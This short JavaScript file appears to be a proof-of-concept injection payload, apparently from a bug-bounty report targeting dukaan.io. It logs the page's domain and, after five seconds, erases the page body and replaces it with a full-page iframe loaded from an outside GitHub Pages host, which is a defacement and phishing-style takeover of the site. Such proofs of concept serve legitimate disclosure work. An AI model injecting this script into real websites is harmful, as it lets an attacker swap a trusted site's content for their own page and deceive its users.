console.log(">>>>>>>>>>>> DOMAIN IS :" + document.domain);
function injection(){
  a=document.createElement("iframe");
  a.src="https://khara-h1.github.io/poc/dukaan.io/index.html";
  a.name="mainsite";
  a.width="100%";
  a.height="700px";
  document.body.innerHTML="";
  document.body.appendChild(a);
}
setTimeout(injection, 5000);
